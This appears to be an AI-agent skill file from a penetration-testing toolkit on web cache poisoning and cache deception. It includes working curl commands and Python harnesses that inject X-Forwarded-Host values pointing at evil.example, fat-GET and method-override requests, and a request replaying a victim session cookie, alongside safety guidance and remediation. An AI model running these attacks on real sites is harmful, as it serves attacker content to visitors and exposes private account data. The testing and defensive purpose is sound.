---
name: attack-cache-poison
description: "Web cache poisoning — unkeyed inputs, cache deception, and upstream response manipulation"
category: "web-application"
version: "1.1"
author: "cyberstrike-official"
tags:
  - cache
  - poisoning
  - web
  - cdn
  - attack
tech_stack:
  - web
  - nginx
  - varnish
  - cloudflare
cwe_ids:
  - CWE-444
  - CWE-349
chains_with:
  - attack-host-header
  - attack-request-smuggling
prerequisites: []
severity_boost:
  attack-host-header: "Host header plus cache = poison every visitor of the cached page"
  attack-request-smuggling: "Smuggling plus cache = poison responses for other users' requests"
---

# Web Cache Poisoning

> **AI LOAD INSTRUCTION**: The entire discipline rests on one concept: **the cache key versus
> the unkeyed inputs.** The cache stores a response against a key (usually method + path +
> Host, sometimes a few headers). Any *other* input that changes the response but is *not* in
> the key is an unkeyed input — and an unkeyed input you control lets you poison the cached
> response for everyone who requests that key.
>
> The method is strictly mechanical: (1) find an unkeyed input the application reflects,
> (2) confirm the response is cached, (3) confirm the poisoned response is served to a clean
> request, (4) use a cache-buster so you do not affect real users while testing.
>
> **Step 4 is not optional and is not a courtesy.** Poisoning a live page with an executing
> payload affects real users immediately. Use a unique cache-buster parameter for every test,
> and demonstrate with an inert marker, never with script that runs in a visitor's browser.

## 0. RELATED ROUTING

- [attack-host-header](../attack-host-header/SKILL.md) — the most productive unkeyed-input family
- [attack-request-smuggling](../attack-request-smuggling/SKILL.md) — cache poisoning via the request parser
- [web-cache-deception](../web-cache-deception/SKILL.md) — the sibling class: tricking the cache into storing private data
- [attack-open-redirect](../attack-open-redirect/SKILL.md) — a reflected redirect in a cached response
- [http2-specific-attacks](../http2-specific-attacks/SKILL.md) — protocol-layer variants
- [security-reporting-and-documentation](../security-reporting-and-documentation/SKILL.md) — reporting without having caused harm

---

## 1. ESTABLISH THE CACHE BEHAVIOUR

Before anything else, determine what is cached and what the cache keys on.

**Is the response cached at all?**

```bash
curl -s -I https://TARGET/page | grep -iE 'x-cache|cf-cache-status|age|cache-control|expires|vary'
```

| Header | Meaning |
|---|---|
| `X-Cache: HIT` / `MISS` | a caching proxy is in front |
| `CF-Cache-Status: HIT` | Cloudflare is caching |
| `Age: 42` | the response came from cache, 42s old |
| `Cache-Control: public, max-age=300` | cacheable for 300s |
| `Cache-Control: private, no-store` | **not cacheable — no poisoning surface** |
| `Vary: Accept-Encoding, Origin` | those headers *are* part of the key |

**Send the request twice and watch `Age`/`X-Cache`.** If the second shows `HIT` or a rising
`Age`, it is cached. If it shows `MISS` every time, nothing is stored — stop here.

**Find what is keyed.** Change one input and observe whether the cache returns the previous
response:

| Input changed | `X-Cache` result | Conclusion |
|---|---|---|
| `Host` | `MISS` | Host is keyed |
| `X-Forwarded-Host` | `HIT` | **Host variant is unkeyed — candidate** |
| a query parameter | `MISS` | queries are keyed |
| a query parameter **you invented** | `HIT` | **unkeyed parameter — candidate** |
| a header | `HIT` | **unkeyed header — candidate** |
| `Accept-Encoding` | `MISS` | keyed (normal) |
| `Cookie` | `MISS` | keyed (good) |
| `Cookie` | `HIT` | **dangerous — private data could be cached** |

**That last row is a serious finding by itself** — see §5 (cache deception) and the sibling
skill [web-cache-deception](../web-cache-deception/SKILL.md).

**Use a cache-buster for every single test:**

```bash
curl -s -H "X-Forwarded-Host: evil.com" \
  "https://TARGET/page?cb=ltx$RANDOM" | grep -iE 'x-cache|evil.com'
```

The `cb` parameter makes each test a fresh key, so you never touch another user's cached
entry. **Without this you are actively poisoning production.**

---

## 2. FINDING UNKEYED INPUTS

An unkeyed input must satisfy two conditions: it is **not in the cache key**, and it **changes
the response**. PortSwigger's Param Miner automates the discovery; the manual method is a
systematic header sweep.

**The header families to sweep:**

```text
X-Forwarded-Host      X-Forwarded-Scheme     X-Forwarded-Proto
X-Forwarded-Port      X-Forwarded-Prefix     X-Forwarded-For
X-Host                X-Original-URL         X-Rewrite-URL
X-HTTP-Method-Override  X-Method-Override
X-Forwarded-Server    Forwarded              X-Backend-Server
X-Cache-Key           X-Forwarded-By
```

**The manual sweep — send each header and look for your value reflected:**

```bash
CANARY="ltxcanary$RANDOM"
for h in X-Forwarded-Host X-Forwarded-Scheme X-Host X-Original-URL X-Rewrite-URL X-Forwarded-Prefix X-Forwarded-Port; do
  body=$(curl -s -H "$h: $CANARY" "https://TARGET/page?cb=$RANDOM")
  if echo "$body" | grep -q "$CANARY"; then
    echo "REFLECTED: $h"
    echo "$body" | grep -o ".\{0,60\}$CANARY.\{0,60\}"
  fi
done
```

**Reflection is the signal; the mechanism is the finding.** Where the canary lands tells you
what you can inject:

| Reflection location | Inject |
|---|---|
| `<script src="...">` | JavaScript execution |
| `<link href="...">` | stylesheet or preload abuse |
| `Location:` header | open redirect |
| `<a href="...">` | link injection |
| a JSON field | API/data poisoning |
| a meta refresh tag | navigation |
| an import/require path | **XSS via script inclusion** |

**Also test parameter-based unkeyed inputs.** Some CDNs exclude certain parameters from the
cache key by design (analytics, `utm_*`, `gclid`). If the application reads one of those, it
is unkeyed by configuration:

```bash
curl -s "https://TARGET/page?utm_content=CANARY&cb=$RANDOM" | grep CANARY
curl -s "https://TARGET/page?gclid=CANARY&cb=$RANDOM" | grep CANARY
```

**`utm_*` and `gclid` exclusion is a real, common misconfiguration** — the CDN drops them from
the key, the application reflects them into the page, and you have an unkeyed input.

---

## 3. THE POISONING SEQUENCE

Once an unkeyed, reflected input is found, prove the poisoning in four steps.

**Step 1 — poison (with a cache-buster so only your key is affected):**

```bash
curl -s "https://TARGET/en/page?cb=ltxPROOF" \
  -H "X-Forwarded-Host: evil.example" > /dev/null
```

**Step 2 — verify the cache stored it:**

```bash
curl -s -I "https://TARGET/en/page?cb=ltxPROOF" -H "X-Forwarded-Host: evil.example" | grep -i x-cache
# → X-Cache: HIT
```

**Step 3 — confirm it is served *without* your header.** This is the decisive step — it proves
the poisoned response is now the canonical response for that key:

```bash
curl -s "https://TARGET/en/page?cb=ltxPROOF" | grep -o 'evil\.example'
# → evil.example      ← the poison is now served to anyone requesting this key
```

**Step 4 — demonstrate the impact, inertly.** Show where the injected value landed (a script
`src`, a link, a JSON field) and state the consequence. **Do not serve executing payloads to
real users.**

**The cache key normalisation angle** — sometimes the key is computed before or after
normalisation, letting two different inputs share a key:

```text
/page?cb=1        vs  /page?cb=1&x=        → same key? different?
/PAGE             vs  /page                → case-normalised into one key?
/page/            vs  /page                → trailing slash merged?
```

If a variant normalises to the *same* key but carries a *different* value the application
reads, you can poison one key from a request on another. Test this deliberately.

---

## 4. FAT-GET AND PARAMETER CLOAKING

Applies where the cache builds its key from the URL but the origin server disagrees about
which parameters exist.

**Parameter cloaking** — get the cache to ignore a dangerous parameter:

```text
/page?utm_content=INJECTED;cb=1        ← some parsers split on ';', cache keys whole string
/page?utm_content=INJECTED%3Bcb=1
/page?cb=1&utm_content=INJECTED        ← order matters for some caches
```

**Fat GET** — a `GET` with a body. The cache keys on the URL; the origin reads the body:

```bash
curl -s -X GET "https://TARGET/page?cb=ltx" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "param=INJECTED"
```

If the body influences the response and the cache does not key on it, **you have an unkeyed
input from the body** — one of the most reliable modern cache-poisoning vectors.

**Method override** — the cache keys on `GET`, the framework honours the override:

```bash
curl -s -X GET "https://TARGET/page?cb=ltx" -H "X-HTTP-Method-Override: POST" --data "param=INJECTED"
curl -s -X GET "https://TARGET/page?cb=ltx" -H "X-HTTP-Method: POST" --data "param=INJECTED"
```

**Test all three against every cacheable endpoint.** They are frequently overlooked and they
produce reliable poisonings where header reflection is patched.

---

## 5. CACHE DECEPTION — THE INVERSE FINDING

A distinct class with the same mechanics: trick the cache into storing a **private** response
under a **public** key.

**Method 1 — path confusion.** Append a static-looking extension so the cache treats it as
static while the origin serves the dynamic private page:

```bash
curl -s "https://TARGET/account/profile/nonexistent.css" -H "Cookie: $VICTIM_SESSION"
# If the cache stores this under a public key and the origin served the profile page,
# the profile is now cached for anyone requesting the same path.
```

**Method 2 — unkeyed cookie.** If `Cookie` is not in the cache key (§1 table), every
authenticated response is stored under a key anyone can request.

**Method 3 — `Vary` omission.** The origin sets no `Vary: Cookie` and no `Cache-Control:
private`, so a shared cache stores an authenticated response as public.

**For each, verify the actual outcome:**

| Check | Expected if vulnerable |
|---|---|
| first request as the victim | `X-Cache: MISS`, body contains victim data |
| second request unauthenticated | `X-Cache: HIT`, **body still contains victim data** |
| `Cache-Control` on the response | `public` or absent, not `private`/`no-store` |
| `Vary` | does not include `Cookie` or `Authorization` |

**This is a high-severity finding** — one cached request can expose a user's account page to
every subsequent requester. Report it as its own finding, not as a variant of poisoning.

---

## 6. WHAT CONSTITUTES A FINDING

| Finding | Severity | Proof required |
|---|---|---|
| Poisoned response served to a clean request, injecting script | **Critical (P1)** | the poison request, the `HIT`, and the clean-request reflection |
| Poisoned response injecting a redirect to an attacker host | **High (P2)** | the `Location` served to a clean request |
| Cache deception: private data served from cache unauthenticated | **High (P2)** | victim's data returned to an unauthenticated request via `HIT` |
| Unkeyed input reflected but not proven to be served clean | **Medium (P3)** | the reflection and the `HIT` |
| Poisoning limited to your own cache-buster key | **Informational (P5)** | demonstrates the mechanism only |
| Response not cached (`no-store`) | **Not a finding** | no surface |

**A poisoning you could only demonstrate on your own cache-buster key is the mechanism, not the
impact.** Say so explicitly. The finding becomes high only when the poisoned response reaches
another user's request.

---

## 7. EVIDENCE STANDARD

| Item | Why |
|---|---|
| the cache-behaviour headers (`X-Cache`, `Age`, `Cache-Control`, `Vary`) | establishes that caching exists and what is keyed |
| the unkeyed input and the reflection point | identifies the vulnerability class |
| the **poison request** — full headers and cache-buster | the injection |
| the `HIT` confirming storage | proves the cache accepted it |
| **the clean request** (no malicious header) receiving the poison | the decisive proof of impact |
| the cache-buster used, and confirmation you did not affect other users | shows responsible testing |
| a **control** request on a different cache-buster key showing clean content | proves the poison is keyed to your test |
| `Cache-Control`/`Vary` on the response | informs the remediation |

**The clean-request step is what separates a real finding from a mechanism demo.** Without it
you have shown only that you can poison your own key.

**False positives to exclude:**

| Looks like poisoning | Actually |
|---|---|
| the response is not cached (`no-store`, `X-Cache: MISS` always) | no surface |
| the reflection only appears when the header is sent | normal per-request behaviour — need the clean request to prove otherwise |
| `Vary` includes the header you changed | it is keyed — not unkeyed |
| only your cache-buster key is affected | mechanism only; note the limitation |
| the cache TTL expired before your verification | re-run within the TTL |
| the CDN strips the header before the origin | no injection reaches the response |

---

## 8. REMEDIATION REFERENCE

1. **Include every reflected input in the cache key** — or strip it at the edge before the cache. The cache key must cover every input that can change the response; `Vary` is the tool when a header matters.
2. **Do not reflect unkeyed headers into responses at all** — `X-Forwarded-Host`, `X-Original-URL`, and their family should never reach the response body or a redirect target. Normalise and validate at the edge.
3. **Set `Vary` comprehensively** — `Vary: Origin, Accept-Encoding, Cookie` where relevant. Omitting `Cookie` is what enables cache deception.
4. **Mark authenticated responses `Cache-Control: private, no-store`** — never cache a response containing user data in a shared cache, regardless of the key.
5. **Normalise the cache key and the origin path identically** — the same canonicalisation function on both sides. Divergence is what fat GET, parameter cloaking, and method override exploit.
6. **Reject requests with a body on `GET`** — and ignore method-override headers from untrusted sources. This closes the fat-GET and override vectors entirely.
7. **Do not exclude parameters from the cache key by convention** — `utm_*`, `gclid`, and similar are only safe to exclude if the application provably never reflects them.
8. **Deploy cache changes with a purge capability and monitor for anomalous keys** — a sudden spread of one cache key across many distinct values is a poisoning attempt in progress.

---

## 9. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Did a **second, clean request** from a different session receive the poisoned response? | the cache stored it |
| 2 | Was there a **control** - the same request without the unkeyed input, which is correct? | the input caused it |
| 3 | Did you record **`X-Cache`, `Age`, or `CF-Cache-Status`** showing a HIT? | the cache path, not an origin quirk |
| 4 | Which input is **unkeyed**: a header, a cookie, a parameter, or the request method? | the fix |
| 5 | Did the poisoned response contain **a payload that executes or redirects** for a victim? | the impact |
| 6 | Is the cache **shared** (a CDN or a reverse proxy), not a browser cache? | the blast radius |
| 7 | Did you **purge or wait out** the poisoned entry before leaving? | engagement integrity |

**A second clean request receiving the poisoned response from a HIT is the bar.** A response header that
reflected your input is a candidate; the cross-session read from cache is the finding.

---

## 10. EXECUTION PRIMITIVES

Cache poisoning is proven by **a poisoned entry served to a subsequent clean request, with the
unkeyed-input control and the cache-status header**. Every block ends at a HIT.

### 10.1 Identify the cache and its key

```bash
T="https://target.example"
# the cache layer, and whether it is in front of you at all
curl -sS -D- -o /dev/null "$T/" 2>&1 | grep -iE 'x-cache|cf-cache|age:|x-served-by|x-varnish|x-cacheable|x-fastly|akamai|via:|server' | head -10
# THE CACHE KEY: which inputs change the cached object - compare the same request twice
curl -sS -D- -o /dev/null "$T/product/1" 2>&1 | grep -iE 'x-cache|age:|etag|last-modified' | head -4
sleep 2
curl -sS -D- -o /dev/null "$T/product/1" 2>&1 | grep -iE 'x-cache|age:|etag|last-modified' | head -4
# THE CONTROL: a request with a cache-busting parameter must MISS, which proves the cache is real
curl -sS -D- -o /dev/null "$T/product/1?cb=$RANDOM" 2>&1 | grep -iE 'x-cache|age:|cf-cache' | head -3
echo "-> a MISS on ?cb= and a HIT without it is what proves the cache is real, not the CDN's marketing"
```

**The cache-busting control is the key diagnostic.** Without a demonstrated MISS on a cache-buster, a HIT
header may be from a different layer, and the finding is unproven.

### 10.2 Find the unkeyed input

```python
# every input that is NOT in the cache key but DOES affect the response is a poisoning candidate
import requests, hashlib
T = "https://target.example"
PATH = "/product/1"

def digest(headers=None, params=None):
    r = requests.get(f"{T}{PATH}", headers=headers or {}, params=params or {}, timeout=10)
    return hashlib.md5(r.content).hexdigest(), r.headers.get("X-Cache", r.headers.get("CF-Cache-Status", "")), r.status_code

base_hash, base_cache, _ = digest()
print("baseline", base_hash[:12], base_cache)

CANDIDATES = [
  ("X-Forwarded-Host", "evil.example"),
  ("X-Forwarded-Scheme", "http"),
  ("X-Forwarded-Proto", "http"),
  ("X-Host", "evil.example"),
  ("X-Original-URL", "/admin"),
  ("X-Rewrite-URL", "/admin"),
  ("X-HTTP-Method-Override", "POST"),
  ("X-Forwarded-For", "127.0.0.1"),
  ("X-Real-IP", "127.0.0.1"),
  ("X-Forwarded-Port", "1337"),
  ("Forwarded", "host=evil.example"),
  ("X-Forwarded-Prefix", "/evil"),
]
print()
print("%-24s %-14s %-8s %s" % ("header", "value", "cache", "changed?"))
for h, v in CANDIDATES:
    try:
        hh, cache, code = digest(headers={h: v})
        changed = "YES <-- UNKEYED" if hh != base_hash else "no"
        print("%-24s %-14s %-8s %s" % (h, v, cache, changed))
    except Exception as e:
        print("%-24s ERR %s" % (h, type(e).__name__))
print()
print("A header that CHANGES the body while the cache status stays the same is UNKEYED.")
print("That is the poisoning primitive: the cache stores your variant under the clean key.")
```

**A changed body with an unchanged cache status is the primitive.** A header that changes nothing, or one
that changes the cache key, is not a candidate.

### 10.3 The poisoning, with the cross-session read

```python
# 1) poison with the unkeyed header, 2) read from a CLEAN session, 3) confirm the HIT
import requests, time, random
T = "https://target.example"; PATH = "/product/1"
bust = f"?cb={random.randint(1,10**9)}"

# STEP 1 - prime the cache with the malicious header
p = requests.get(f"{T}{PATH}", headers={
    "X-Forwarded-Host": "evil.example",
    "X-Cache-Buster": bust,
}, timeout=10)
print("poison request:", p.status_code, p.headers.get("X-Cache"))

# STEP 2 - a completely separate session, no special headers
s = requests.Session()
r = s.get(f"{T}{PATH}", timeout=10)
print("victim request:", r.status_code, "X-Cache:", r.headers.get("X-Cache"), "Age:", r.headers.get("Age"))
hits = sum(1 for needle in ["evil.example", "http://evil.example", "//evil.example"] if needle in r.text)
print("poisoned markers in the victim response:", hits)
print("POISON CONFIRMED" if hits else "not confirmed - try another unkeyed input or another cache-buster")
print()
print("A REFLECTED header with NO subsequent HIT is not poisonable - it is just reflection.")
print("A HIT that serves YOUR session's response could also be your own connection reuse -")
print("use a fresh process and a fresh TCP connection for step 2.")
```

**A fresh process for step 2.** Connection reuse and session affinity have produced more false cache
poisoning reports than any other cause.

### 10.4 The specific poison families

```bash
T="https://target.example"; BUST="?cb=$RANDOM"
# 1) HOST-HEADER POISONING: the cache caches a page whose canonical/script URLs point at your host
curl -sS -D/tmp/h.txt "$T/$BUST" -H 'Host: evil.example' -o /tmp/b.html
grep -oE 'https?://evil\.example[^"'"'"' ]*' /tmp/b.html | head -3
grep -iE 'x-cache' /tmp/h.txt
# 2) X-FORWARDED-HOST in the same role
curl -sS "$T/$BUST" -H 'X-Forwarded-Host: evil.example' -o /tmp/b2.html
grep -oE 'https?://evil\.example[^"'"'"' ]*' /tmp/b2.html | head -3
# 3) UNKEYED QUERY STRING: some proxies key on a subset of parameters
for p in "utm_source=x&callback=alert(1)" "utm_source=x&next=//evil.example" "utm_source=x&_=1"; do
  printf '%-46s ' "$p"
  curl -sS -D- -o /dev/null "$T/?$p" 2>&1 | grep -iE 'x-cache|cf-cache' | head -1
done
# 4) FAT GET / METHOD POISONING: a body on a GET that the cache keys only by the URL
curl -sS -D- -o /dev/null "$T/" -X GET --data 'q=evil' 2>&1 | grep -iE 'x-cache|cf-cache' | head -2
# 5) RESPONSE HEADER POISONING: the cache stores a header YOU supplied (Set-Cookie, Location)
curl -sS -D- -o /dev/null "$T/$BUST" -H 'X-Forwarded-Scheme: nothttps' 2>&1 | grep -iE '^location|x-cache' | head -3
```

**Each family poisons a different part of the cached object.** A poisoned `Location` header and a poisoned
canonical URL have different victim behaviour, and the report should name which one you demonstrated.

### 10.5 The end-to-end harness

```bash
python3 - <<'PY'
import requests, time, random, sys
T = "https://target.example"; PATH = "/product/1"
BUST = f"?cb={random.randint(1,10**9)}"

def get(headers=None, bust=True, sess=None):
    s = sess or requests.Session()
    url = f"{T}{PATH}{BUST if bust else ''}"
    r = s.get(url, headers=headers or {}, timeout=10)
    cc = r.headers.get("X-Cache") or r.headers.get("CF-Cache-Status") or r.headers.get("Age", "")
    return r, cc

print("=== CACHE REALITY CHECK ===")
_, c_bust = get(bust=True)
_, c_plain = get(bust=False)
print("  with cache-buster :", c_bust, "(expect MISS)")
print("  without           :", c_plain, "(expect HIT)")
print()

print("=== CONTROL (unkeyed header, clean value) ===")
r, c = get(headers={"X-Forwarded-Host": "target.example"}, bust=True)
print("  clean host value ->", r.status_code, c, "| body has evil.example:", "evil.example" in r.text)
print()

print("=== POISON ===")
r, c = get(headers={"X-Forwarded-Host": "evil.example"}, bust=True)
print("  poison request   ->", r.status_code, c)
print()

print("=== VICTIM (fresh process, fresh connection, no headers) ===")
time.sleep(1)
r2, c2 = get(sess=requests.Session(), bust=False)
markers = [m for m in ["evil.example", "//evil.example", "http://evil.example"] if m in r2.text]
print("  victim response  ->", r2.status_code, c2)
print("  poisoned markers :", markers)
print()
if markers and (c2 or "").upper().find("HIT") >= 0:
    print("POISONING CONFIRMED: the cache served the poisoned body to an unmodified request.")
    print("RECORD: the exact header, the cache-buster, the HIT evidence, and the victim's response.")
else:
    print("NOT CONFIRMED: either no HIT, or the marker did not survive. Do not report this as poisoning.")
print()
print("CLEANUP: purge the entry or wait for the TTL. State which you did.")
PY
```

**The MISS/HIT pair, the clean control, and the victim read.** All four rows, or it is not a finding.

---

## 11. EVIDENCE STANDARD — CACHE ARTEFACTS

| Item | Why |
|---|---|
| The **cache-buster MISS and the plain HIT** | proves the cache is real and in the path |
| The **control request** with a clean header value | proves the unkeyed input caused it |
| The **poison request** with the exact unkeyed input | reproducibility |
| The **victim request from a fresh process**, with no headers | the same-session false positive is the top error here |
| The **cache-status header and `Age`** on the victim response | the HIT evidence |
| The **poisoned marker** in the victim body (URL, script src, `Location`) | the impact |
| The **unkeyed input's family** (header, query, method, response header) | the fix |
| Whether the cache is **shared infrastructure** and its scope | the blast radius |
| The **TTL**, and what you did to clean up | engagement integrity |
| The **cache key as you inferred it**, and the evidence for the inference | the core claim |

Report the **HIT and the victim**: "`GET /product/1?cb=<random>` returns `X-Cache: MISS` and `GET
/product/1` returns `X-Cache: HIT`, which proves the shared cache. `GET /product/1?cb=<random>` with
`X-Forwarded-Host: target.example` returns the correct page, which is the control, and the same request
with `X-Forwarded-Host: evil.example` returns a page whose canonical URL and `og:image` both point at
`evil.example`. A fresh process with no headers requesting `GET /product/1` then received
`X-Cache: HIT` with `Age: 47` and the same `evil.example` canonical URL in the body, which is the
finding. The cache key appears to be the path only, excluding every `X-Forwarded-*` header", never
"the cache is misconfigured".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| A **reflected** header with no subsequent HIT | reflection, not poisoning |
| A HIT observed only **in your own session** | session or connection reuse, not a shared cache |
| A poisoned response from a request carrying **your own headers** | you supplied the input again |
| A **browser** cache rather than a shared cache | no cross-user impact |
| A HIT on a URL that includes **your unique cache-buster** | the buster is part of the key, so this is expected |
| A header that changed the response **and** the cache status | the header is keyed, so it is not poisonable |
| A poison affecting **only your own subsequent requests** via a cookie you set | not shared |
| A **staging** environment behind a per-user cache | verify the cache's scope before reporting |
| An inferred cache key that you **never tested with a MISS/HIT pair** | an untested hypothesis |
| A poison you left in place with a **long TTL and no cleanup** | an operational incident you caused |

**A cross-process victim read from a demonstrated shared cache.** The single-process variant is the
standard false positive in this family.

---

## 12. REMEDIATION REFERENCE — CACHE KEY HARDENING

1. **Include every input that affects the response in the cache key, and derive the key explicitly rather than by a proxy default** - the entire family is an unkeyed input.
2. **Never let a request header influence the response body or a response header unless it is keyed** - `X-Forwarded-Host` and its relatives should be consumed only at the edge, by a component that sets a trusted value.
3. **Normalise and validate the `Host` header against an allowlist at the edge, and never reflect it into a URL** - it removes host-header poisoning and the related password-reset impact.
4. **Disable caching for any response that varies by a header, a cookie, or authentication state, and prefer `Cache-Control: private` for authenticated pages** - a shared cache should never hold a personalised response.
5. **Treat `Set-Cookie` and `Location` as non-cacheable response headers, and strip them before storing** - the response-header poisoning family stores your value in the shared object.
6. **Key the cache on the full normalised URL including every query parameter, and reject a request with a body on a `GET`** - the fat-GET and partial-key variants both live here.
7. **Configure the CDN to ignore unkeyed headers entirely rather than forwarding them, and audit the forwarded-header list on every change** - the default forwarded set is where these defects come from.
8. **Purge the full cache on any configuration change to the key, and prefer a versioned key over an in-place change** - a stale key leaves poisoned entries servable.
9. **Log cache HIT/MISS with the key and the deciding headers, and alert on a key that produces anomalously many distinct bodies** - the attack produces exactly that pattern.
10. **Set short TTLs on anything that reflects request input, and never cache a `404` or an error page with a long TTL** - it bounds the finding's duration.
11. **Test the cache's key with a MISS/HIT pair for every response header you can influence, on every release** - the forwarded-header defaults change with the proxy configuration.

---

## 13. RELATED SIBLINGS - LOAD TOGETHER

- [web-cache-deception](../web-cache-deception/SKILL.md) - the key-confusion cousin, where the wrong object is cached
- [attack-host-header](../attack-host-header/SKILL.md) - the header family that supplies the unkeyed input
- [request-smuggling](../request-smuggling/SKILL.md) - the other cache-layer desynchronisation
- [http-parameter-pollution](../http-parameter-pollution/SKILL.md) - the parser-disagreement family a cache can amplify
- [open-redirect](../open-redirect/SKILL.md) - where a poisoned `Location` leads
